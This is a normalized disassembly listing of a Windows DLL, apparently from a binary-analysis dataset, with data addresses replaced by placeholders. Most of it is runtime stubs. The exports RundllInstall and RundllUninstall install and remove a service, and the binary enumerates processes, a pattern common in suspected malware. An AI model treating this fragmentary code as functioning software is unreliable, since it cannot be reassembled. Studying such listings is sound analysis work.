mov eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
movzx eax ax
and eax ecx
leave
retn
sub_10001070
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_1000901e
pop ecx
sub_10001680
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov eax [ eax + 0x10 ]
dec ecx
test eax eax
jne r-xdata
test ecx ecx
je r-xdata
sub_10003530
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov cx [ esp + 0x8 ]
or [ eax + 0x24 ] cx
sub_10003fc0
mov [ ecx ] r--data
retn
sub_10003fd0
mov al [ esp + 0x4 ]
push esi
mov esi ecx
test al 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000901e
add esp 0x4
sub_10004e90
push esi
mov esi ecx
call sub_10004eb0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000901e
add esp 0x4
sub_10007320
mov eax [ esp + 0x4 ]
add ecx 0xcf8
push eax
call sub_10008910
retn 0x4
sub_10007965
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10007970
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_10007990
or cl al
mov [ rw-data ] cl
sub_10007990
push sub_100079a0
call sub_1000ab25
pop ecx
retn
sub_100079a0
retn
sub_100079b0
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
mov eax 0x1
retn 0xc
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
sub_10007c40
call sub_10008c00
xor eax eax
retn
RundllInstall
mov eax [ esp + 0xc ]
push eax
call ServiceInstall
pop ecx
retn 0x10
sub_1000818c
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ebp - 0x2c ] edx
mov eax 0x1
retn
RundllUninstall
mov eax [ esp + 0xc ]
push eax
call UnServiceInstall
pop ecx
retn 0x10
sub_100081f0
retn
sub_10008200
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_10008220
or cl al
mov [ rw-data ] cl
sub_10008220
push sub_100079a0
call sub_1000ab25
pop ecx
retn
sub_10008230
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x14c ] ecx
mov [ eax + 0x148 ] cx
mov [ eax + 0x144 ] ecx
mov [ eax + 0x154 ] ecx
mov [ eax + 0x28 ] 0x1
retn
sub_10008260
push esi
mov esi ecx
call sub_10008280
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000901e
add esp 0x4
sub_10008630
mov ax [ esp + 0x4 ]
mov [ ecx + 0x148 ] ax
mov eax 0x1
retn 0x4
sub_10008650
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov [ ecx + 0x154 ] 0x0
mov eax 0x1
retn 0x4
mov eax 0x1
mov [ ecx + 0x154 ] eax
retn 0x4
sub_10008900
mov eax [ esp + 0x4 ]
mov [ ecx + 0x24 ] eax
retn 0x4
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_10009010
push 0x1
push [ esp + 0x8 ]
call sub_100096ff
pop ecx
pop ecx
retn
sub_1000901e
push [ esp + 0x4 ]
call sub_10009e3d
pop ecx
retn
sub_10009549
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_10009697
push 0x9
call sub_1000b2cf
pop ecx
xor edi edi
retn
sub_10009792
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_100097f1
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_10009b65
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10009b7c
add esp 0x10
retn
sub_10009ea7
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_10009eff
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_1000a1bb
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_1000a1c2
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_1000a3ea
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000a490
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000a51a
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1000a490
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1000a546
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_1000a6ca
push [ esp + 0x4 ]
call sub_1000a63f
pop ecx
retn
sub_1000aa94
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_1000aa63
add esp 0xc
retn
sub_1000ab25
push [ esp + 0x4 ]
call sub_1000aaa7
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_1000adca
push esi
mov esi ecx
call sub_1000ada1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000901e
pop ecx
sub_1000b015
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_1000a4b2
add esp 0x8
pop ebp
retn 0x4
sub_1000b1d9
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_1000bd03
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_1000bd10
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_1000bd20
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_1000d7ce
push 0x1
pop eax
retn
sub_1000da33
call sub_1000eb2a
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_10010263
sub_1000e1c1
push [ ebp - 0x14 ]
call sub_1000e1f8
pop ecx
retn
sub_1000e1f8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_1000e7f8
xor eax eax
retn
sub_1000e32e
push [ ebp - 0x14 ]
call sub_1000e3a4
pop ecx
retn
sub_1000e586
push 0x1
pop eax
retn
sub_1000e58a
mov esp [ ebp - 0x18 ]
jmp sub_1000e7f8
sub_1000e5e8
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1000e5f1
mov esp [ ebp - 0x18 ]
jmp sub_1000e7f8
sub_1000e6c0
call sub_1000b202
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000e6de
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_1000e840
push 0x1
pop eax
retn
sub_1000e896
push 0x1
pop eax
retn
sub_1000eb2a
push 0x1
call sub_1000eb33
pop ecx
retn
sub_1000f238
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_1000f33c
push rw-data
push rw-data
call sub_1000f33c
add esp 0x10
retn
call eax
sub_1000f265
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_1000f285
add esp 0xc
retn
sub_1000f276
push 0x1
push 0x0
push 0x0
call sub_1000f285
add esp 0xc
retn
sub_1000f32a
push 0xd
call sub_1000b26e
pop ecx
retn
sub_1000f333
push 0xd
call sub_1000b2cf
pop ecx
retn
sub_1000f3c0
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_1000f43b
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_1000f51a
push sub_1000f4d4
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_1000f52b
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_1000feb8
push 0x1
pop eax
retn
sub_1000ff6c
push 0x1
pop eax
retn
sub_100101bf
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_10010248
push 0x9
call sub_1000b2cf
pop ecx
retn
sub_100105a3
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_100105c5
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_100105e1
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_100105fd
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_10010d66
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_1001098e
pop ecx
mov [ rw-data ] 0x1
sub_10010ef7
push 0x1
pop eax
retn
sub_10010f54
push 0x1
pop eax
retn
sub_100110d1
push 0x2
call sub_1000b1a6
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10011695
push 0x1
pop eax
retn
sub_10011712
push 0x1
pop eax
retn
sub_10011820
lea ecx [ ebp - 0xa8 ]
jmp sub_10003fc0
sub_1001182b
mov eax r--data
jmp sub_1000a218
sub_10011840
mov ecx [ ebp - 0x10 ]
add ecx 0xcf8
jmp sub_10008280
sub_1001184e
mov eax r--data
jmp sub_1000a218
sub_10011860
mov eax r--data
jmp sub_1000a218
sub_10011870
lea ecx [ ebp - 0xf88 ]
call sub_10004eb0
retn
sub_1001187c
mov eax r--data
jmp sub_1000a218
